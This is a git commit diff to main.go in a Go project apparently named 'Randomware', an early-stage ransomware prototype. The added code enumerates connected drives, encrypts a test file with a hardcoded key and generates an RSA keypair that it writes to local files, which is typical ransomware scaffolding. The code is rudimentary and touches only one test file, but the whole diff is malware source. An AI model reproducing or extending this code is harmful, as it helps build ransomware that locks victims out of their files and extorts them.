b54ad5203168102165c88d4ccab7ce361d1f48e7
Peter Balivet <peterbalivet@gmail.com>
2021-01-17 16:27:42 +0100

    setup directory

--- main.go
+++ main.go
@@ -1,14 +1,22 @@
 package main
 
 import (
+	"Randomware/disk"
 	"Randomware/file"
+	"crypto/rand"
+	"crypto/rsa"
 	"fmt"
+	"log"
 	"os"
 )
 
 func main() {
+	//Print connected drives
+	fmt.Println(disk.GetDrives())
+
+	//Encrypt file
 	key := []byte("PeterBalivet2347")
-	file, err := file.Decrypt("test.mp4.ec", key)
+	file, err := file.Encrypt("test.mp4", key)
 
 	if err != nil {
 		os.Exit(1)
@@ -16,4 +24,26 @@ func main() {
 
 	fmt.Println(file)
 
+	//Create private/public keys
+	keys, err := rsa.GenerateKey(rand.Reader, 2048)
+	if err != nil {
+		log.Fatal(err)
+	}
+	keyPubFile, err := os.Create("rsa_key.pub")
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	_, err = keyPubFile.WriteString(fmt.Sprintf("%d\n", keys.PublicKey.N))
+	_, err = keyPubFile.WriteString(fmt.Sprintf("%d\n", keys.PublicKey.E))
+
+	keyPubFile.Close()
+
+	keyPrivFile, err := os.Create("rsa_key.priv")
+	if err != nil {
+		log.Fatal(err)
+	}
+	_, err = keyPrivFile.WriteString(fmt.Sprintf("%d\n", keys.D))
+	_, err = keyPrivFile.WriteString(fmt.Sprintf("%d\n", keys.Primes))
+	keyPrivFile.Close()
 }
